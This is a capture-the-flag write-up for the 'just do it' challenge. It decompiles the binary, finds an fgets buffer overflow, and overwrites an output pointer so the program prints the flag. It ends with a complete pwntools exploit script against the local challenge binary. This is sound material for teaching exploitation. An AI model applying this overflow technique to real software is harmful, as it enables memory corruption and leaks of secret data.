**This is a writeup for tw19 just do it challenge**

Lets take a look at our main code below
```
undefined4 main(void)

{
  char local_EAX_154;
  FILE *flagFile;
  int cmp;
  char input [16];
  FILE *flagHandle;
  char *target;
 
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  target = failed_message;
  flagFile = fopen("flag.txt","r");
  if (flagFile == (FILE *)0x0) {
    perror("file open error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  _local_EAX_154 = fgets(flag,0x30,flagFile);
  if (_local_EAX_154 == (char *)0x0) {
    perror("file read error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  _local_EAX_154 = fgets(input,0x20,stdin);
  if (_local_EAX_154 == (char *)0x0) {
    perror("input error.\n");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  cmp = strcmp(input,PASSWORD);
  if (cmp == 0) {
    target = success_message;
  }
  puts(target);
  return 0;
}
```

The first thing we see is that the program is checking if the flag.txt file exists:
```
flagHandle = fopen(:flag.txt", "r");
if(flagHandle == (FILE *)0x0) {
    perror("file read error.\n");
    exit(0);
}
```

Now the next thing the program does is load 48 bytes from the flag.txt file into our flag bss in the program. This basically is just copying the contents of flag.txt and then storing it in one of the symbols of the program. This means we can access the contents of this symbol by finding its address in Ghidra.
```
pcVar1 = fgets(flag,0x30,flagHandle);
if(pcVar1 == (char *)0x0) {
    perror("file read error.\n");
    exit(0);
}
```

In this program, we are given an input buffer that asks us for the correct password. It then checks if this password is equal to the password stored in the PASSWORD bss.
```
puts("Input the password.");
pcVar1 = fgets(input,0x20,stdin);
if(pcVar1 == (char *)0x0) {
    perror("Input error.\n");
    exit(0);
}
Var2 = strcmp(input,PASSWORD);
if(Var2 == 0) {
    target = success_message;
}
puts(target)
```

If we click on PASSWORD, we can see that the correct password is "P@SSW0RD". Since we are using fgets, we must follow our input with a null byte.

Our payload should look like this:
```
payload= b"P@SSW0RD" + p32(0x0)
```

After we run our exploit, we can see that it prints out the success_message "Correct Password, Welcome!"

This does not give us the flag unfortunately so we still need to find the right exploit.

If we look at the fgets function, the program is allowing us to put in 32 bytes of data into stdin. But if we at the stack, our input is only allocated 16 bytes of space meaning we can use a buffer overflow attack. 

The important line of code was this:
```
puts(target)
```

So although the program wants to output either the failed_message or success_message if we get the password correct, we can actually overwrite this value to output the address of the flag bss which we know contains the context of flag.txt since it read the file and stored 48 bytes of content.

Lets take a look at the stack to see where the target lives. 
```
Stack[-0x14]:4 target
Stack[-0x18]: flagHandle
Stack[-0x28]:16 input
```

Now if we calculate the offset between the input buffer and the target we can see it is 0x28 - 0x14 = 0x14 which is 1 x 16 + 4 = 20 bytes.

We know that the previous fgets allows up to 32 bytes of input so that means we can overflow the input buffer and write into the target value. Now all that is left is to find the address of the flag bss so that we can put that into the target value.

After looking, we can see that the flag bss lives at the address 0x0804a080

Now that means we can construct our payload:
```
payload = b"A" * 20 + p32(0x0804a080)
```

Now if we run the exploit, we can see that it prints the contents of flag.txt
**SINCE this is an old challenge, you have to make your own flag.txt and have it contain 48 characters**

**Final Exploit**
```
from pwn import *

BINARY="./just_do_it"

elf=ELF(BINARY)
context.binary=elf

OFFSET = 0x14

payload = b"A" * OFFSET + p32(0x0804a080)

def exploit_local():
    r=process(BINARY)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    exploit_local()
```